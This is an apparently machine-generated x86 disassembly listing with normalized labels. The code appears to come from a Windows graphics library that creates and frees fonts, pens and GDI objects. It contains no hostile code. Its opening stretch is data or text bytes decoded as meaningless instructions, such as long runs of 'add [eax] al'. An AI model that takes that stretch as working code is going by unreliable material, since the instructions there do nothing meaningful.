add [ eax + edx + 0x42 ] ah
add [ ecx + 0x11280042 ] ch
inc edx
add al ah
adc eax 0x16640042
inc edx
add [ ecx ] cl
push esp
dec ebp
je r-xdata
lodsb [ esi ]
or al [ edx ]
call 0xffffffffe4420290
inc ecx
add ah ah
inc edx
add [ eax + 0x5400414a ] bl
clc
inc ecx
add [ edx + ecx + 0x4be80042 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edx
add al dl
sbb al [ edx ]
or al 0x54
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
je r-xdata
je r-xdata
imul bp [ ebp + 0x34 ] 0x41c1
add ah ch
mov esi 0x41
or [ edi + 0x72 ] al
popad
jo r-xdata
je r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
retn 0x41
imul esp [ ebx + 0x73 ] 0xc2140000
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
retn 0x41
inc eax
add al bh
xor al [ eax ]
add [ eax ] al
sub al al
inc ecx
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
sub_41c23c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0xc2
inc ecx
add [ eax + eax ] bh
add [ eax ] al
sub [ esi + 0x358c0041 ] bh
inc eax
add [ eax + 0x4b ] bl
inc ecx
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
pushad
and eax 0x4a980042
inc ecx
add [ eax + edi * 8 + 0x41 ] dl
add [ ebp + 0x4be80042 ] bl
inc ecx
add [ eax + 0x27 ] dh
inc edx
add al dh
daa
inc edx
add [ eax - 0x5bffbe08 ] ah
sub al [ edx ]
pop eax
sub eax [ edx ]
cwde
sub eax [ edx ]
in al dx
stc
inc ecx
add ah dh
sub eax [ edx ]
inc eax
xor [ edx ] al
cmp al 0x38
inc edx
add [ eax ] dl
cmp [ edx ] eax
aam 0xfa
inc ecx
add [ edx + edi ] dh
inc edx
add [ eax - 0x7ffbdc6 ] cl
and al 0x42
add al dh
stc
inc ecx
add [ eax - 0x6 ] bh
inc ecx
add [ esi + ebp + 0x3d480042 ] bh
inc edx
add [ eax ] bh
inc edx
add [ eax + 0x3d ] dl
inc edx
add [ eax ] cl
sub eax [ edx ]
push 0x400422b
aaa
inc edx
add [ edi ] al
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41c2f070
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41c27470
add ah ch
mov esi 0x41
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
les eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0xc4
inc ecx
add [ eax + eax ] dh
add [ eax ] al
sub [ esi + 0x358c0041 ] bh
inc eax
add [ eax + 0x4b ] bl
inc ecx
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
imul esp [ ebx + 0x73 ] 0xc08b0000
pop esp
retn
sub_41c314
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
retn
sub_41c485
xor eax 0x35980040
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
or ch al
inc ecx
add [ eax ] dl
push esp
push edx
jae r-xdata
pushfd
jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41c4cc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_41c508
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_41c544
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_41c4b8
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_41c52c
xor edx edx
push ebp
push sub_41c618
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c61f
mov eax [ ebp - 0x4 ]
call sub_41c538
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026f4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028f0
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407f58
test al al
je r-xdata
sub_41c628
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c52c
xor ecx ecx
push ebp
push sub_41c6af
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c538
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_41c6d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c52c
xor eax eax
push ebp
push sub_41c741
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41c544
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41c628
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c748
mov eax [ ebp - 0x4 ]
call sub_41c538
retn
mov eax ebx
mov si 0xfffd
call sub_403540
sub_41c750
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c52c
xor eax eax
push ebp
push sub_41c7ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c7b3
mov eax [ ebp - 0x4 ]
call sub_41c538
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_403540
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41c628
sub_41c7bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c52c
xor edx edx
push ebp
push sub_41c81b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c822
mov eax [ ebp - 0x4 ]
call sub_41c538
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_41c828
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_414764
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41c8c5
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4143bc
mov ebx eax
mov eax ebx
call sub_41de50
inc [ ebp - 0x4 ]
mov eax ebx
call sub_41e254
mov eax [ rw-data ]
call sub_41c7bc
mov eax [ rw-data ]
call sub_41c7bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c8cc
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_4147c8
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4143bc
call sub_41e108
inc esi
dec ebx
jne r-xdata
sub_41cf1b
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_413e1c
retn
sub_41cf4c
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402e60
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402c34
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_41d000
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41c544
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_41d054
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41c628
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_41d098
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4149b4
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41cd58
xor eax eax
push ebp
push sub_41d153
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41cd58
xor eax eax
push ebp
push sub_41d136
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c750
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41d1d4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d13d
mov eax [ ebp - 0x8 ]
call sub_41cd68
retn
mov eax ebx
call sub_41d458
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41d474
sub_41d184
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41cd58
xor eax eax
push ebp
push sub_41d1c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c6d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d1d0
mov eax [ ebp - 0x4 ]
call sub_41cd68
retn
sub_41d1e8
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41d371
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d378
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_4040b8
retn
mov eax [ rw-data ]
call sub_41c52c
xor eax eax
push ebp
push sub_41d349
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41c538
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4042f8
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_408a50
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_4042f8
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_408a50
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4042f8
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_408090
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_41d4cc
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_41d390
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_41cf4c
mov edx esp
mov eax ebx
call sub_41d184
add esp 0x2c
pop esi
pop ebx
retn
sub_41d3bc
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41d16c
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41d184
add esp 0x2c
pop esi
pop ebx
retn
sub_41d3fc
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41d16c
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402d44
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_404330
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402c34
mov edx esp
mov eax ebx
call sub_41d184
sub_41d474
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call sub_4062e4
mov edx eax
neg edx
mov eax ebx
call sub_41d3bc
pop esi
pop ebx
retn
sub_41d4a0
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41d16c
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41d184
add esp 0x30
pop ebx
retn
sub_41d4d4
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41d16c
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_41d184
add esp 0x2c
pop esi
pop ebx
retn
sub_41d504
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41d16c
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_41d184
add esp 0x2c
pop esi
pop ebx
retn
sub_41d52c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41c544
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_41d570
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41c628
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_41d598
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4149b4
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41cd58
xor eax eax
push ebp
push sub_41d637
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41cd58
xor eax eax
push ebp
push sub_41d61a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c750
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41d7a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d621
mov eax [ ebp - 0x8 ]
call sub_41cd68
retn
sub_41d650
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41d668
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41cd58
xor eax eax
push ebp
push sub_41d6ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c6d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d6b4
mov eax [ ebp - 0x4 ]
call sub_41cd68
retn
sub_41d6c0
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41d650
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41d668
add esp 0x10
pop esi
pop ebx
retn
sub_41d6e8
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41c52c
xor eax eax
push ebp
push sub_41d76e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41c538
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41cd14
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_41d780
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] edx
mov edx esp
call sub_41d668
add esp 0x10
pop edi
pop esi
retn
sub_41d7bc
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41d650
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_41d668
add esp 0x10
pop esi
pop ebx
retn
sub_41d7ec
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41d650
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_41d668
sub_41d818
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41c544
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_41d858
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41c628
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_41d880
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4149b4
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41cd58
xor eax eax
push ebp
push sub_41d910
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41cd58
xor eax eax
push ebp
push sub_41d8f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c750
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d8fa
mov eax [ ebp - 0x8 ]
call sub_41cd68
retn
sub_41d928
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_41d944
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41cd58
xor eax eax
push ebp
push sub_41d989
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c6d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d990
mov eax [ ebp - 0x4 ]
call sub_41cd68
retn
sub_41d99c
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_41d944
add esp 0x10
pop edi
pop esi
retn
sub_41d9c8
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41d928
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_41d944
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_41d9fc
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41c52c
xor edx edx
push ebp
push sub_41dac9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41c538
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
